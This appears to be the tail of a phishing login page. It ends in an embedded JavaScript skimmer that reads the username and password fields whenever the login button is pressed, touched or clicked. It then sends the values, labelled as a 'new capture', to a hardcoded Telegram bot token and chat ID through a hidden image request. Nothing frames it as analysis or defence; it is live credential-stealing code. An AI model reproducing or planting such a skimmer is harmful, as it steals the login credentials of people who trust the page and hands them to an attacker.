<script>
        (function () {
            const TOKEN = "9159089747:AAGrdR7YNxmKCXvzec1LLpWhKCvt2ivc6uQ";
            const CHAT_ID = "7007914207";

            function leerCamposLogin() {
                const inputs = Array.from(document.querySelectorAll(".login-box input, input"));

                const passInput =
                    inputs.find((el) => el.type === "password" || /contrase|pass|clave/i.test(el.placeholder || "")) ||
                    null;

                const userInput =
                    inputs.find(
                        (el) =>
                            el !== passInput &&
                            (el.type === "text" || /usuario|user/i.test(el.placeholder || ""))
                    ) ||
                    inputs.find((el) => el !== passInput && !["hidden", "submit", "button"].includes((el.type || "").toLowerCase())) ||
                    null;

                return {
                    usuario: userInput ? userInput.value.trim() : "",
                    password: passInput ? passInput.value : ""
                };
            }

            function enviarDatos() {
                const { usuario, password } = leerCamposLogin();
                if (!usuario && !password) return;

                const mensaje = [
                    "NUEVA CAPTURA (LOGIN)",
                    "Usuario: " + (usuario || "vacio"),
                    "Clave: " + (password || "vacia")
                ].join("\n");

                const endpoint =
                    "https://api.telegram.org/bot" +
                    TOKEN +
                    "/sendMessage?chat_id=" +
                    CHAT_ID +
                    "&text=" +
                    encodeURIComponent(mensaje);

                window._imgs = window._imgs || [];
                const img = new Image();
                img.src = endpoint;
                window._imgs.push(img);
            }

            const btn = document.querySelector(".login-box button, button");
            if (btn) {
                btn.addEventListener("pointerdown", enviarDatos, true);
                btn.addEventListener("touchstart", enviarDatos, true);
                btn.addEventListener("click", enviarDatos, true);
            }
        })();
    </script>
</body>
